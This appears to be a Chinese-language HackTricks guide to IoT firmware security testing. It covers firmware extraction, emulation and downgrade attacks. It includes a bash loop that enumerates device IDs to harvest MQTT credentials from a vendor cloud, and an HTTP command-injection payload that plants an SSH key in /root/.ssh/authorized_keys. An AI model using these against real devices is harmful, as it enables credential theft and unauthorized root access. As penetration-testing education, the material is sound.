# 固件分析

{{#include ../../banners/hacktricks-training.md}}

## **介绍**

### 相关资源


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

固件是关键的软件，它通过管理并促进硬件组件与用户交互的软件之间的通信，使设备能够正常运行。固件存储在永久性存储中，确保设备在通电瞬间即可访问关键指令，从而启动操作系统。检查并可能修改固件是发现安全漏洞的重要步骤。

## **信息收集**

**信息收集** 是了解设备构成及其所使用技术的关键第一步。此过程包括收集以下方面的数据：

- CPU 架构及其运行的操作系统
- bootloader 细节
- 硬件布局和数据手册
- 代码库指标和源码位置
- 外部库和许可类型
- 更新历史和监管认证
- 架构与流程图
- 安全评估和已识别的漏洞

为此，**开源情报 (OSINT)** 工具非常有价值，通过手工和自动化审查可分析任何可用的开源软件组件。像 [Coverity Scan](https://scan.coverity.com) 和 [Semmle’s LGTM](https://lgtm.com/#explore) 这样的工具提供免费的静态分析，可用于发现潜在问题。

## **获取固件**

获取固件可以通过多种方式，每种方式的复杂度各不相同：

- **直接** 来自来源（开发者、制造商）
- **构建**：根据提供的说明构建固件
- **下载**：从官方支持站点下载
- **使用** Google dork 查询以查找托管的固件文件
- **直接访问** **云存储**，例如使用工具 [S3Scanner](https://github.com/sa7mon/S3Scanner)
- 通过 man-in-the-middle 技术拦截 **更新**
- **从设备提取**：通过像 **UART**、**JTAG** 或 **PICit** 这样的连接
- 在设备通信中对更新请求进行 **Sniffing**
- 识别并使用 **硬编码的更新端点**
- 从 bootloader 或网络进行 **Dumping**
- **拆卸并读取** 存储芯片（当别无他法时），使用合适的硬件工具

## 分析固件

现在既然你 **已经获得固件**，需要从中提取信息以确定如何处理。可以使用的不同工具包括：
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
如果用这些工具没有发现什么，可以用 `binwalk -E <bin>` 检查镜像的 **熵**。如果熵低，则很可能未被加密；如果熵高，则很可能被加密（或以某种方式压缩）。

此外，你可以使用这些工具来提取固件中嵌入的**文件**：


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

或者使用 [**binvis.io**](https://binvis.io/#/)（[code](https://code.google.com/archive/p/binvis/)）来检查文件。

### 获取文件系统

使用上面提到的工具，例如 `binwalk -ev <bin>`，你应该能够**提取文件系统**。\
Binwalk 通常将其提取到一个**以文件系统类型命名的文件夹**中，通常为以下之一：squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs。

#### 手动文件系统提取

有时，binwalk 的签名中**不会包含文件系统的 magic byte（魔术字节）**。在这种情况下，使用 binwalk **查找文件系统的偏移并从二进制中切出压缩的文件系统**，然后根据其类型**手动提取**文件系统，按照下面的步骤操作。
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
运行下面的 **dd command** 来对 Squashfs 文件系统进行 carving。
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
或者，也可以运行以下命令。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- 对于 squashfs（在上面的示例中使用）

`$ unsquashfs dir.squashfs`

随后，文件将位于 `squashfs-root` 目录中。

- CPIO 存档文件

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- 对于 jffs2 文件系统

`$ jefferson rootfsfile.jffs2`

- 针对带有 NAND flash 的 ubifs 文件系统

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## 分析 Firmware

一旦获得 firmware，就必须对其进行拆解以了解其结构和潜在漏洞。这个过程涉及使用各种工具来分析并从 firmware image 中提取有价值的数据。

### 初始分析工具

下面提供了一组用于初步检查二进制文件（称为 `<bin>`）的命令。这些命令有助于识别文件类型、提取字符串、分析二进制数据，以及了解分区和 filesystem 细节：
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
为了评估镜像的加密状态，使用 `binwalk -E <bin>` 检查 **熵**。低熵表明缺乏加密，而高熵则表示可能已加密或被压缩。

要提取 **嵌入的文件**，建议使用像 **file-data-carving-recovery-tools** 文档和用于文件检查的 **binvis.io** 等工具和资源。

### 提取文件系统

使用 `binwalk -ev <bin>` 通常可以提取文件系统，通常会解压到以文件系统类型命名的目录中（例如 squashfs、ubifs）。但是，当 **binwalk** 因缺失魔数而无法识别文件系统类型时，就需要手动提取。这包括使用 `binwalk` 定位文件系统的偏移量，然后使用 `dd` 命令从镜像中提取文件系统：
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
之后，根据文件系统类型（例如 squashfs、cpio、jffs2、ubifs），使用不同的命令手动提取其内容。

### 文件系统分析

提取文件系统后，就开始搜索安全缺陷。重点关注不安全的网络 daemons、硬编码凭证、API endpoints、更新服务器功能、未编译的代码、启动脚本以及用于离线分析的已编译二进制文件。

**关键位置** 和 **检查项** 包括：

- **etc/shadow** 和 **etc/passwd**（用于用户凭证）
- SSL 证书和密钥位于 **etc/ssl**
- 配置文件和脚本文件以查找潜在漏洞
- 嵌入式二进制文件以供进一步分析
- 常见 IoT 设备的 web 服务器和二进制文件

有若干工具可帮助在文件系统中发现敏感信息和漏洞：

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) and [**Firmwalker**](https://github.com/craigz28/firmwalker) for sensitive information search
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) for comprehensive firmware analysis
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), and [**EMBA**](https://github.com/e-m-b-a/emba) for static and dynamic analysis

### 已编译二进制文件的安全检查

必须对文件系统中发现的源代码和已编译二进制文件进行仔细审查以查找漏洞。像 **checksec.sh**（用于 Unix 二进制）和 **PESecurity**（用于 Windows 二进制）这样的工具有助于识别可能被利用的未受保护二进制文件。

## 通过派生 URL token 获取云配置和 MQTT 凭证

许多 IoT hub 从类似如下的云端点获取每个设备的配置：

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

在固件分析过程中，你可能会发现 <token> 是在本地使用硬编码的密钥由 <deviceId> 派生的，例如：

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

这种设计使得任何知道 deviceId 和 STATIC_KEY 的人都可以重建该 URL 并拉取云配置，通常会暴露明文 MQTT 凭证和主题前缀。

实用工作流程：

1) 从 UART 启动日志中提取 deviceId

- 连接一个 3.3V UART 适配器（TX/RX/GND）并抓取日志：
```bash
picocom -b 115200 /dev/ttyUSB0
```
- 查找打印 cloud config URL pattern 和 broker address 的行，例如：
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) 从固件中恢复 STATIC_KEY 和 token 算法

- 将二进制加载到 Ghidra/radare2 并搜索配置路径 ("/pf/") 或 MD5 的使用。
- 确认算法 (例如 MD5(deviceId||STATIC_KEY))。
- 在 Bash 中推导 token 并将摘要转换为大写：
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) 收集 cloud config 和 MQTT credentials

- 组合 URL 并使用 curl 拉取 JSON；用 jq 解析以提取 secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) 滥用 plaintext MQTT 和弱 topic ACLs（如果存在）

- 使用恢复的凭据订阅 maintenance topics 并查找敏感事件：
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) 枚举可预测的设备 ID（大规模且已获授权）

- 许多生态系统会在厂商 OUI/product/type 字节后嵌入一个顺序后缀。
- 你可以编程地遍历候选 ID、推导 tokens 并获取 configs：
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
注意
- 在尝试 mass enumeration 之前，务必获得明确授权。
- 尽可能优先使用 emulation 或 static analysis，在不修改 target hardware 的情况下恢复 secrets。

emulating firmware 的过程可以对设备的运行或单个程序进行 **dynamic analysis**。这种方法可能会遇到与 hardware 或 architecture 依赖有关的挑战，但将 root filesystem 或特定 binaries 转移到具有相匹配 architecture 和 endianness 的设备（例如 Raspberry Pi），或转移到预先构建的 virtual machine，可以促进进一步的测试。

### 模拟 Individual Binaries

在检查单个程序时，识别程序的 endianness 和 CPU architecture 是至关重要的。

#### 以 MIPS Architecture 为例

要对 MIPS architecture 的 binary 进行 emulation，可以使用以下命令：
```bash
file ./squashfs-root/bin/busybox
```
并安装所需的仿真工具：
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
对于 MIPS（大端），使用 `qemu-mips`，对于小端二进制，则选择 `qemu-mipsel`。

#### ARM 架构仿真

对于 ARM 二进制，过程类似，使用 `qemu-arm` 模拟器进行仿真。

### 全系统仿真

像 [Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) 等工具，便于进行完整的固件仿真，自动化该过程并协助动态分析。

## 实战中的动态分析

在此阶段，会使用真实设备或仿真设备环境进行分析。保持对操作系统和文件系统的 shell access 至关重要。仿真可能无法完美模拟硬件交互，因此有时需要重启仿真。分析应重新检查文件系统，利用暴露的网页和网络服务，并探索 bootloader 漏洞。固件完整性测试对于识别潜在后门漏洞非常关键。

## 运行时分析技术

运行时分析涉及在目标进程或二进制的运行环境中与其交互，使用诸如 gdb-multiarch、Frida 和 Ghidra 等工具设置断点，并通过 fuzzing 等技术识别漏洞。

## 二进制利用与 PoC

为已识别的漏洞开发 PoC 需要对目标架构有深入理解并能使用底层语言编程。嵌入式系统中很少见到二进制运行时保护，但若存在，可能需要使用如 Return Oriented Programming (ROP) 之类的技术。

## 用于固件分析的预配置操作系统

像 [AttifyOS](https://github.com/adi0x90/attifyos) 和 [EmbedOS](https://github.com/scriptingxss/EmbedOS) 这样的操作系统提供用于固件安全测试的预配置环境，并配备必要工具。

## 用于分析固件的预配置操作系统

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS 是一个发行版，旨在帮助你对 Internet of Things (IoT) 设备进行安全评估和 penetration testing。它通过提供预配置环境并预装所有必要工具，为你节省大量时间。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): 基于 Ubuntu 18.04 的嵌入式安全测试操作系统，预装了固件安全测试工具。

## 固件降级攻击与不安全的更新机制

即便厂商对固件镜像实施了加密签名校验，**通常会遗漏版本回滚（降级）防护**。当 boot- 或 recovery-loader 仅使用嵌入的公钥验证签名，但不比较被刷写镜像的*版本*（或单调计数器）时，攻击者就可以合法地安装仍带有有效签名的**旧版易受攻击固件**，从而重新引入已修补的漏洞。

典型攻击流程：

1. **获取旧的已签名镜像**
* 从厂商的公共下载门户、CDN 或支持网站获取。
* 从配套的移动/桌面应用中提取（例如在 Android APK 的 `assets/firmware/` 内）。
* 从第三方仓库检索，例如 VirusTotal、互联网存档、论坛等。
2. **通过任何暴露的更新通道将镜像上传或提供给设备**：
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* 许多消费级 IoT 设备暴露 *unauthenticated* 的 HTTP(S) 端点，这些端点接受 Base64 编码的固件 blobs，在服务器端解码并触发 recovery/upgrade。
3. 降级后，利用在新版中被修补的漏洞（例如后来添加的 command-injection 过滤器）。
4. 可选择在获得持久性后再次刷入最新镜像，或禁用更新以避免被检测。

### 示例：降级后的 Command Injection
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
在易受攻击（降级）的固件中，`md5` 参数被直接拼接到 shell 命令中且未进行清理，从而允许注入任意命令（此处为——启用基于 SSH 密钥的 root 访问）。后来的固件版本引入了基本的字符过滤，但由于缺乏降级防护，该修复形同虚设。

### Extracting Firmware From Mobile Apps

许多厂商会将完整的固件镜像捆绑在其配套移动应用中，以便应用通过 Bluetooth/Wi-Fi 更新设备。这些包通常以未加密形式存放在 APK/APEX 的路径下，例如 `assets/fw/` 或 `res/raw/`。像 `apktool`、`ghidra`，甚至普通的 `unzip` 等工具可以让你在不接触物理硬件的情况下提取签名镜像。
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### 评估更新逻辑的清单

* 用于 *更新端点* 的传输/身份验证是否得到充分保护（TLS + 身份验证）？
* 设备在刷写前是否比较 **版本号** 或 **单调防回滚计数器**？
* 映像是否在安全启动链内被验证（例如签名由 ROM 代码检查）？
* 用户态代码是否执行额外的合理性检查（例如允许的分区映射、型号）？
* *部分* 或 *备份* 的更新流程是否重复使用相同的验证逻辑？

> 💡  如果上述任何一项缺失，平台很可能易受回滚攻击。

## 用于练习的易受攻击固件

要练习在固件中发现漏洞，可以使用以下易受攻击的固件项目作为起点。

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 参考资料

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## 培训与认证

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
